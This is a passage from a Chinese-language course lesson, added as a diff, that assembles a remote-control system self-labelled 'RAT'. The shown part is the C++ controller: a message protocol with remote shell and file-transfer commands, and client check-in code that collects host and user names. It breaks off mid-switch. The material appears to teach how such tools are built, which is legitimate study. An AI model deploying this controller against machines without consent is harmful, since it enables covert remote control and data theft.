@@ -1,0 +1,835 @@
+<h1 id="section-1">课时07 - 阶段合集</h1><h2 id="section-2">课程目标</h2><ol><li>整合远程控制系统的全部功能模块</li><li>构建完整的客户端和服务端程序</li><li>实现模块间的协调工作</li><li>掌握远程控制系统的整体架构</li></ol><h2 id="section-3">知识回顾</h2><h3 id="section-4">远程控制系统架构</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>┌─────────────────────────────────────────────────────────────────┐</span></span>
+<span class="line"><span>│                        控制端 (Server)                           │</span></span>
+<span class="line"><span>│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │</span></span>
+<span class="line"><span>│  │  网络通信    │  │  命令处理    │  │  用户界面    │              │</span></span>
+<span class="line"><span>│  └─────────────┘  └─────────────┘  └─────────────┘              │</span></span>
+<span class="line"><span>└─────────┬─────────────────┬─────────────────┬───────────────────┘</span></span>
+<span class="line"><span>          │                 │                 │</span></span>
+<span class="line"><span>          ▼                 ▼                 ▼</span></span>
+<span class="line"><span>    ┌─────────┐       ┌─────────┐       ┌─────────┐</span></span>
+<span class="line"><span>    │ Client1 │       │ Client2 │       │ Client3 │</span></span>
+<span class="line"><span>    │ (被控端) │       │ (被控端) │       │ (被控端) │</span></span>
+<span class="line"><span>    └─────────┘       └─────────┘       └─────────┘</span></span>
+<span class="line"><span></span></span></code></pre><h3 id="section-5">核心功能模块</h3><table><thead><tr><th>模块</th><th>功能</th><th>课时</th></tr></thead><tbody><tr><td>通信架构</td><td>客户端上线、心跳维护</td><td>课时01</td></tr><tr><td>进程管理</td><td>进程枚举、信息获取</td><td>课时02</td></tr><tr><td>文件系统</td><td>文件浏览、信息获取</td><td>课时03</td></tr><tr><td>文件上传</td><td>客户端→服务端文件传输</td><td>课时04</td></tr><tr><td>文件下载</td><td>服务端→客户端文件传输</td><td>课时05</td></tr><tr><td>远程Shell</td><td>命令执行、输出回显</td><td>课时06</td></tr></tbody></table><h2 id="section-6">代码实现</h2><h3 id="section-7">1. 完整服务端程序</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// server_main.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 完整远程控制服务端</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;winsock2.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;map></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;thread></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;mutex></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;ctime></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> comment</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">lib</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"ws2_32.lib"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> MAGIC_NUMBER</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">52415400</span><span style="color:#6A737D">  // "RAT\0"</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> SERVER_PORT</span><span style="color:#79B8FF">     8888</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> MAX_CLIENTS</span><span style="color:#79B8FF">     100</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">push</span><span style="color:#E1E4E8">, 1)</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#B392F0"> _MSG_HEADER</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD magic;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD cmdType;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dataLen;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD clientId;</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#B392F0">MSG_HEADER</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">*</span><span style="color:#B392F0">PMSG_HEADER</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令类型定义</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_ONLINE</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">0001</span><span style="color:#6A737D">  // 上线</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_HEARTBEAT</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">0002</span><span style="color:#6A737D">  // 心跳</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SYSINFO</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">0003</span><span style="color:#6A737D">  // 系统信息</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_PROCLIST</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0004</span><span style="color:#6A737D">  // 进程列表</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_FILELIST</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0005</span><span style="color:#6A737D">  // 文件列表</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0006</span><span style="color:#6A737D">  // 下载文件（客户端→服务端）</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">0007</span><span style="color:#6A737D">  // 上传文件（服务端→客户端）</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL</span><span style="color:#F97583">       0x</span><span style="color:#79B8FF">0008</span><span style="color:#6A737D">  // Shell命令</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 文件传输相关命令</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_REQUEST</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">1001</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_START</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">1002</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_DATA</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">1003</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_ACK</span><span style="color:#F97583">       0x</span><span style="color:#79B8FF">1004</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_COMPLETE</span><span style="color:#F97583">  0x</span><span style="color:#79B8FF">1005</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD_ERROR</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">1006</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_REQUEST</span><span style="color:#F97583">  0x</span><span style="color:#79B8FF">2001</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_START</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">2002</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_DATA</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">2003</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_ACK</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">2004</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_COMPLETE</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">2005</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD_ERROR</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">2006</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_EXECUTE</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">3001</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_OUTPUT</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">3002</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_COMPLETE</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">3003</span></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">pop</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 客户端信息</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#B392F0"> _CLIENT_INFO</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">    SOCKET socket;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD clientId;</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string ip;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD lastHeartbeat;</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#E1E4E8"> isAlive;</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string computerName;</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string userName;</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#B392F0">CLIENT_INFO</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">*</span><span style="color:#B392F0">PCLIENT_INFO</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 全局变量</span></span>
+<span class="line"><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::map</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">DWORD, CLIENT_INFO</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> g_clients;</span></span>
+<span class="line"><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex g_clientMutex;</span></span>
+<span class="line"><span style="color:#E1E4E8">DWORD g_nextClientId </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#E1E4E8"> g_serverRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 前向声明</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> HandleClient</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> clientSock</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">sockaddr_in</span><span style="color:#FFAB70"> clientAddr</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> SendCommand</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> sock</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> clientId</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> cmdType</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> dataLen</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> ListClients</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> HandleCommand</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70"> cmdLine</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 发送数据</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> SendData</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> sock</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> len</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> sent </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (sent </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> len) {</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">=</span><span style="color:#B392F0"> send</span><span style="color:#E1E4E8">(sock, (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)data </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> sent, len </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> sent, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        sent </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> n;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 接收数据</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> RecvData</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> sock</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> len</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> received </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (received </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> len) {</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">=</span><span style="color:#B392F0"> recv</span><span style="color:#E1E4E8">(sock, (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)data </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> received, len </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> received, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        received </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> n;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 发送命令</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> SendCommand</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> sock</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> clientId</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> cmdType</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> dataLen</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    MSG_HEADER header;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.magic </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> MAGIC_NUMBER;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.cmdType </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> cmdType;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.dataLen </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dataLen;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.clientId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> clientId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">SendData</span><span style="color:#E1E4E8">(sock, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">header, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(header))) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (dataLen </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> data) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">SendData</span><span style="color:#E1E4E8">(sock, data, dataLen)) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 处理客户端连接</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> HandleClient</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">SOCKET</span><span style="color:#FFAB70"> clientSock</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">sockaddr_in</span><span style="color:#FFAB70"> clientAddr</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> clientIp[</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">    inet_ntop</span><span style="color:#E1E4E8">(AF_INET, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clientAddr.sin_addr, clientIp, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(clientIp));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] New connection from </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">:</span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, clientIp, </span><span style="color:#B392F0">ntohs</span><span style="color:#E1E4E8">(clientAddr.sin_port));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (g_serverRunning) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 接收消息头</span></span>
+<span class="line"><span style="color:#E1E4E8">        MSG_HEADER header;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">RecvData</span><span style="color:#E1E4E8">(clientSock, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">header, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(header))) {</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 验证魔数</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (header.magic </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> MAGIC_NUMBER) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Invalid magic number from </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, clientIp);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 接收数据</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;char></span><span style="color:#B392F0"> data</span><span style="color:#E1E4E8">(header.dataLen);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (header.dataLen </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">RecvData</span><span style="color:#E1E4E8">(clientSock, data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), header.dataLen)) {</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 处理命令</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (header.cmdType) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_ONLINE: {</span></span>
+<span class="line"><span style="color:#6A737D">                // 客户端上线</span></span>
+<span class="line"><span style="color:#E1E4E8">                DWORD clientId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> g_nextClientId</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#E1E4E8">                CLIENT_INFO ci;</span></span>
+<span class="line"><span style="color:#E1E4E8">                ci.socket </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> clientSock;</span></span>
+<span class="line"><span style="color:#E1E4E8">                ci.clientId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> clientId;</span></span>
+<span class="line"><span style="color:#E1E4E8">                ci.ip </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> clientIp;</span></span>
+<span class="line"><span style="color:#E1E4E8">                ci.lastHeartbeat </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetTickCount</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">                ci.isAlive </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (header.dataLen </span><span style="color:#F97583">>=</span><span style="color:#79B8FF"> 64</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 64</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 128</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 32</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    ci.computerName </span><span style="color:#F97583">=</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#E1E4E8">(data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), </span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    ci.userName </span><span style="color:#F97583">=</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#E1E4E8">(data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 64</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6A737D">                    // 可以解析更多系统信息</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#E1E4E8">                {</span></span>
+<span class="line"><span style="color:#B392F0">                    std</span><span style="color:#E1E4E8">::lock_guard</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex</span><span style="color:#F97583">></span><span style="color:#B392F0"> lock</span><span style="color:#E1E4E8">(g_clientMutex);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    g_clients[clientId] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ci;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Client </span><span style="color:#79B8FF">%lu</span><span style="color:#9ECBFF"> online: </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">@</span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                    clientId, ci.userName.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), ci.computerName.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#6A737D">                // 发送确认</span></span>
+<span class="line"><span style="color:#B392F0">                SendCommand</span><span style="color:#E1E4E8">(clientSock, clientId, CMD_ONLINE);</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_HEARTBEAT: {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::lock_guard</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::mutex</span><span style="color:#F97583">></span><span style="color:#B392F0"> lock</span><span style="color:#E1E4E8">(g_clientMutex);</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (g_clients.</span><span style="color:#B392F0">count</span><span style="color:#E1E4E8">(header.clientId)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    g_clients[header.clientId].lastHeartbeat </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetTickCount</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_SYSINFO:</span></span>
